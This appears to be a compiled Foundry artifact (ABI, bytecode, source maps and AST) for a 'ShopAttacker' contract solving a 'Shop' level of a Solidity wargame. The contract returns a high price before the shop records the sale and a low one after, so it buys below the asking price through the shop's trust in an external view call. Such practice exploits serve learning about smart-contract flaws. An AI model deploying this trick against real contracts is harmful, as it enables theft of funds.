@@ -1,0 +1,644 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_shop",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "attack",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "price",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "shop",
+      "outputs": [
+        {
+          "internalType": "contract IShop",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "bytecode": {
+    "object": "0x608060405234801561001057600080fd5b5060405161026d38038061026d83398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6101da806100936000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80630881fa0d146100465780639e5faafc14610076578063a035b1fe14610080575b600080fd5b600054610059906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b61007e610096565b005b6100886100f1565b60405190815260200161006d565b6000805460408051635379571d60e11b815290516001600160a01b039092169263a6f2ae3a9260048084019382900301818387803b1580156100d757600080fd5b505af11580156100eb573d6000803e3d6000fd5b50505050565b60008060009054906101000a90046001600160a01b03166001600160a01b031663e852e7416040518163ffffffff1660e01b8152600401602060405180830381865afa158015610145573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610169919061017b565b156101745750603290565b506103e890565b60006020828403121561018d57600080fd5b8151801515811461019d57600080fd5b939250505056fea26469706673582212204ac5777192b78a5a6609ce9f126f7e0ec7b85d30c7cdf224816d71169f37cd8e64736f6c634300080f0033",
+    "sourceMap": "161:340:103:-:0;;;213:63;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;250:4;:19;;-1:-1:-1;;;;;;250:19:103;-1:-1:-1;;;;;250:19:103;;;;;;;;;;161:340;;14:290:124;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:124;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:124:o;:::-;161:340:103;;;;;;",
+    "linkReferences": {}
+  },
+  "deployedBytecode": {
+    "object": "0x608060405234801561001057600080fd5b50600436106100415760003560e01c80630881fa0d146100465780639e5faafc14610076578063a035b1fe14610080575b600080fd5b600054610059906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b61007e610096565b005b6100886100f1565b60405190815260200161006d565b6000805460408051635379571d60e11b815290516001600160a01b039092169263a6f2ae3a9260048084019382900301818387803b1580156100d757600080fd5b505af11580156100eb573d6000803e3d6000fd5b50505050565b60008060009054906101000a90046001600160a01b03166001600160a01b031663e852e7416040518163ffffffff1660e01b8152600401602060405180830381865afa158015610145573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610169919061017b565b156101745750603290565b506103e890565b60006020828403121561018d57600080fd5b8151801515811461019d57600080fd5b939250505056fea26469706673582212204ac5777192b78a5a6609ce9f126f7e0ec7b85d30c7cdf224816d71169f37cd8e64736f6c634300080f0033",
+    "sourceMap": "161:340:103:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;189:17;;;;;-1:-1:-1;;;;;189:17:103;;;;;;-1:-1:-1;;;;;193:32:124;;;175:51;;163:2;148:18;189:17:103;;;;;;;;445:54;;;:::i;:::-;;282:157;;;:::i;:::-;;;383:25:124;;;371:2;356:18;282:157:103;237:177:124;445:54:103;482:4;;;:10;;;-1:-1:-1;;;482:10:103;;;;-1:-1:-1;;;;;482:4:103;;;;:8;;:10;;;;;;;;;;:4;;:10;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;445:54::o;282:157::-;322:4;342;;;;;;;;;-1:-1:-1;;;;;342:4:103;-1:-1:-1;;;;;342:11:103;;:13;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;338:95;;;-1:-1:-1;378:2:103;;282:157::o;338:95::-;-1:-1:-1;418:4:103;;282:157::o;419:277:124:-;486:6;539:2;527:9;518:7;514:23;510:32;507:52;;;555:1;552;545:12;507:52;587:9;581:16;640:5;633:13;626:21;619:5;616:32;606:60;;662:1;659;652:12;606:60;685:5;419:277;-1:-1:-1;;;419:277:124:o",
+    "linkReferences": {}
+  },
+  "methodIdentifiers": {
+    "attack()": "9e5faafc",
+    "price()": "a035b1fe",
+    "shop()": "0881fa0d"
+  },
+  "ast": {
+    "absolutePath": "src\\21-Shop\\ShopAttacker.sol",
+    "id": 27186,
+    "exportedSymbols": {
+      "IShop": [
+        27144
+      ],
+      "ShopAttacker": [
+        27185
+      ]
+    },
+    "nodeType": "SourceUnit",
+    "src": "32:469:103",
+    "nodes": [
+      {
+        "id": 27135,
+        "nodeType": "PragmaDirective",
+        "src": "32:24:103",
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".13"
+        ]
+      },
+      {
+        "id": 27144,
+        "nodeType": "ContractDefinition",
+        "src": "58:100:103",
+        "nodes": [
+          {
+            "id": 27140,
+            "nodeType": "FunctionDefinition",
+            "src": "80:47:103",
+            "functionSelector": "e852e741",
+            "implemented": false,
+            "kind": "function",
+            "modifiers": [],
+            "name": "isSold",
+            "nameLocation": "89:6:103",
+            "parameters": {
+              "id": 27136,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "95:2:103"
+            },
+            "returnParameters": {
+              "id": 27139,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 27138,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 27140,
+                  "src": "121:4:103",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_bool",
+                    "typeString": "bool"
+                  },
+                  "typeName": {
+                    "id": 27137,
+                    "name": "bool",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "121:4:103",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "120:6:103"
+            },
+            "scope": 27144,
+            "stateMutability": "view",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 27143,
+            "nodeType": "FunctionDefinition",
+            "src": "132:24:103",
+            "functionSelector": "a6f2ae3a",
+            "implemented": false,
+            "kind": "function",
+            "modifiers": [],
+            "name": "buy",
+            "nameLocation": "141:3:103",
+            "parameters": {
+              "id": 27141,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "144:2:103"
+            },
+            "returnParameters": {
+              "id": 27142,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "155:0:103"
+            },
+            "scope": 27144,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "IShop",
+        "contractDependencies": [],
+        "contractKind": "interface",
+        "fullyImplemented": false,
+        "linearizedBaseContracts": [
+          27144
+        ],
+        "name": "IShop",
+        "nameLocation": "68:5:103",
+        "scope": 27186,
+        "usedErrors": []
+      },
+      {
+        "id": 27185,
+        "nodeType": "ContractDefinition",
+        "src": "161:340:103",
+        "nodes": [
+          {
+            "id": 27147,
+            "nodeType": "VariableDeclaration",
+            "src": "189:17:103",
+            "constant": false,
+            "functionSelector": "0881fa0d",
+            "mutability": "mutable",
+            "name": "shop",
+            "nameLocation": "202:4:103",
+            "scope": 27185,
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_IShop_$27144",
+              "typeString": "contract IShop"
+            },
+            "typeName": {
+              "id": 27146,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 27145,
+                "name": "IShop",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 27144,
+                "src": "189:5:103"
+              },
+              "referencedDeclaration": 27144,
+              "src": "189:5:103",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_IShop_$27144",
+                "typeString": "contract IShop"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "id": 27159,
+            "nodeType": "FunctionDefinition",
+            "src": "213:63:103",
+            "body": {
+              "id": 27158,
+              "nodeType": "Block",
+              "src": "240:36:103",
+              "statements": [
+                {
+                  "expression": {
+                    "id": 27156,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 27152,
+                      "name": "shop",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 27147,
+                      "src": "250:4:103",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_IShop_$27144",
+                        "typeString": "contract IShop"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "id": 27154,
+                          "name": "_shop",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 27149,
+                          "src": "263:5:103",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 27153,
+                        "name": "IShop",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 27144,
+                        "src": "257:5:103",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_IShop_$27144_$",
+                          "typeString": "type(contract IShop)"
+                        }
+                      },
+                      "id": 27155,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "257:12:103",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_IShop_$27144",
+                        "typeString": "contract IShop"
+                      }
+                    },
+                    "src": "250:19:103",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_IShop_$27144",
+                      "typeString": "contract IShop"
+                    }
+                  },
+                  "id": 27157,
+                  "nodeType": "ExpressionStatement",
+                  "src": "250:19:103"
+                }
+              ]
+            },
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "parameters": {
+              "id": 27150,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 27149,
+                  "mutability": "mutable",
+                  "name": "_shop",
+                  "nameLocation": "233:5:103",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 27159,
+                  "src": "225:13:103",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 27148,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "225:7:103",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "224:15:103"
+            },
+            "returnParameters": {
+              "id": 27151,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "240:0:103"
+            },
+            "scope": 27185,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "id": 27175,
+            "nodeType": "FunctionDefinition",
+            "src": "282:157:103",
+            "body": {
+              "id": 27174,
+              "nodeType": "Block",
+              "src": "328:111:103",
+              "statements": [
+                {
+                  "condition": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "id": 27164,
+                        "name": "shop",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 27147,
+                        "src": "342:4:103",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_IShop_$27144",
+                          "typeString": "contract IShop"
+                        }
+                      },
+                      "id": 27165,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "isSold",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 27140,
+                      "src": "342:11:103",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_view$__$returns$_t_bool_$",
+                        "typeString": "function () view external returns (bool)"
+                      }
+                    },
+                    "id": 27166,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "342:13:103",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_bool",
+                      "typeString": "bool"
+                    }
+                  },
+                  "falseBody": {
+                    "id": 27172,
+                    "nodeType": "Block",
+                    "src": "397:36:103",
+                    "statements": [
+                      {
+                        "expression": {
+                          "hexValue": "31303030",
+                          "id": 27170,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "kind": "number",
+                          "lValueRequested": false,
+                          "nodeType": "Literal",
+                          "src": "418:4:103",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_rational_1000_by_1",
+                            "typeString": "int_const 1000"
+                          },
+                          "value": "1000"
+                        },
+                        "functionReturnParameters": 27163,
+                        "id": 27171,
+                        "nodeType": "Return",
+                        "src": "411:11:103"
+                      }
+                    ]
+                  },
+                  "id": 27173,
+                  "nodeType": "IfStatement",
+                  "src": "338:95:103",
+                  "trueBody": {
+                    "id": 27169,
+                    "nodeType": "Block",
+                    "src": "357:34:103",
+                    "statements": [
+                      {
+                        "expression": {
+                          "hexValue": "3530",
+                          "id": 27167,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "kind": "number",
+                          "lValueRequested": false,
+                          "nodeType": "Literal",
+                          "src": "378:2:103",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_rational_50_by_1",
+                            "typeString": "int_const 50"
+                          },
+                          "value": "50"
+                        },
+                        "functionReturnParameters": 27163,
+                        "id": 27168,
+                        "nodeType": "Return",
+                        "src": "371:9:103"
+                      }
+                    ]
+                  }
+                }
+              ]
+            },
+            "functionSelector": "a035b1fe",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "price",
+            "nameLocation": "291:5:103",
+            "parameters": {
+              "id": 27160,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "296:2:103"
+            },
+            "returnParameters": {
+              "id": 27163,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 27162,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 27175,
+                  "src": "322:4:103",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 27161,
+                    "name": "uint",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "322:4:103",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "321:6:103"
+            },
+            "scope": 27185,
+            "stateMutability": "view",
+            "virtual": false,
+            "visibility": "external"
+          },
+          {
+            "id": 27184,
+            "nodeType": "FunctionDefinition",
+            "src": "445:54:103",
+            "body": {
+              "id": 27183,
+              "nodeType": "Block",
+              "src": "472:27:103",
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [],
+                    "expression": {
+                      "argumentTypes": [],
+                      "expression": {
+                        "id": 27178,
+                        "name": "shop",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 27147,
+                        "src": "482:4:103",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_IShop_$27144",
+                          "typeString": "contract IShop"
+                        }
+                      },
+                      "id": 27180,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberName": "buy",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 27143,
+                      "src": "482:8:103",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
+                        "typeString": "function () external"
+                      }
+                    },
+                    "id": 27181,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "482:10:103",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 27182,
+                  "nodeType": "ExpressionStatement",
+                  "src": "482:10:103"
+                }
+              ]
+            },
+            "functionSelector": "9e5faafc",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "454:6:103",
+            "parameters": {
+              "id": 27176,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "460:2:103"
+            },
+            "returnParameters": {
+              "id": 27177,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "472:0:103"
+            },
+            "scope": 27185,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "ShopAttacker",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "linearizedBaseContracts": [
+          27185
+        ],
+        "name": "ShopAttacker",
+        "nameLocation": "170:12:103",
+        "scope": 27186,
+        "usedErrors": []
+      }
+    ],
+    "license": "MIT"
+  },
+  "id": 103
+}
